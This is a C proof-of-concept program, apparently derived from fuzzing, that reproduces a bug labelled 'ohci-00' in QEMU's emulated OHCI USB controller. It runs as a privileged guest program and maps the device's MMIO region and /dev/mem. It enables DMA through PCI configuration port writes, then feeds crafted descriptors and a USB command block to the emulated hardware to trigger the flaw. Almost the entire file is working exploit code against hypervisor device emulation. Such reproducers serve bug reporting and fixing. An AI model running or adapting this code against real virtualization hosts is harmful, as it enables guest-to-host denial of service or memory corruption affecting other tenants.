#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

//
// OHCI specific structs
//
typedef struct ohci_hcca {
    uint32_t intr[32];
    uint16_t frame, pad;
    uint32_t done;
} ohci_hcca;

typedef struct ohci_ed {
    uint32_t flags;
    uint32_t tail;
    uint32_t head;
    uint32_t next;
} ohci_ed;

typedef struct ohci_td {
    uint32_t flags;
    uint32_t cbp;
    uint32_t next;
    uint32_t be;
} ohci_td;

typedef struct ohci_iso_td {
    uint32_t flags;
    uint32_t bp;
    uint32_t next;
    uint32_t be;
    uint16_t offset[8];
} ohci_iso_td;

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce ohci-00: start\n[+]\n");

    // lspci -v and we will get ohci's pci address
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x100, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    // GDB
    // gef config context.nb_lines_backtrace 2
    // b ../hw/usb/hcd-ohci.c:1591
    // b ../hw/usb/hcd-ohci.c:924
 
    // we want to enable the bus master bit to enable DMA
    iopl(3);
    uint32_t command_address;
    uint32_t command_status;
    command_address = 0x80000000 | 0x0000 << 16 | 0x03 << 11 | 0x0 << 8 | 0x04;
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    // write
    command_status |= 0x4;
    outl(command_address, 0xcf8);
    outl(command_status, 0xcfc);
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    sleep(1);

    // set up dependent buffers
    ohci_hcca *hcca0 = (ohci_hcca *)calloc_256aligned(sizeof(ohci_hcca));
    uint64_t hcca0_phys = gva_to_gpa(hcca0);

    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed0_phys = gva_to_gpa(ed0);
    ohci_ed *ed1 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed1_phys = gva_to_gpa(ed1);

    ohci_td *td0 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
    uint64_t td0_phys = gva_to_gpa(td0);
    ohci_td *td1 = (ohci_td *)calloc_256aligned(sizeof(ohci_td));
    uint64_t td1_phys = gva_to_gpa(td1);

    // Note that cwb starts from __cbw[1]
    uint32_t *__cbw = (uint32_t *)calloc_256aligned(0x20);
    __cbw[0] = 0x42535500;
    __cbw[1] = 0x44926a43;
    __cbw[2] = 0x00006408;
    __cbw[3] = 0x08ef6600;
    __cbw[4] = 0x70bfb903;
    __cbw[5] = 0x70bfb955;
    __cbw[6] = 0x70bfb955;
    __cbw[7] = 0x70bfb955;
    uint64_t __cbw_phys = gva_to_gpa(__cbw);
    td0->flags = 0xdedc9979;
    td0->cbp = __cbw_phys + 1;
    td0->next = (uint32_t)td1_phys;
    td0->be = __cbw_phys + 0x1f;

    ed0->flags = 0xfde70900;
    ed0->tail = (uint32_t)td1_phys;
    ed0->head = (uint32_t)td0_phys;
    ed0->next = (uint32_t)ed1_phys;

    hcca0->intr[0] = ed0_phys;
    hcca0->intr[1] = ed0_phys;

    // reset
    mmio_write(0x8/*hccommandstatus*/, 0x1/*OHCI_STATUS_HCR*/);
    // a mmio write drived from our fuzzer: set status of port 0
    mmio_write(0x54, 0x2b63935a);
    // a, set ohci->ctl and enable OHCI_CTL_PLE (0x4)
    mmio_write(0x4/*hccontrol*/, 0x1fd0290e | 0xc0);
    // b, fill hcca, sleep, and invoke ohci_frame_boudary
    mmio_write(0x18/*hchcca*/, hcca0_phys/*OHCI_CTL_PLE*/);
    mmio_write(0x4/*hccontrol*/, 0x1fd0298e | 0x80);
    sleep(1);
    mmio_write(0x4/*hccontrol*/, 0x1fd0298e | 0xc0);

    printf("[+]\n[+] Reproduce ohci-00: fail\n[+]\n");

    return 0;
}
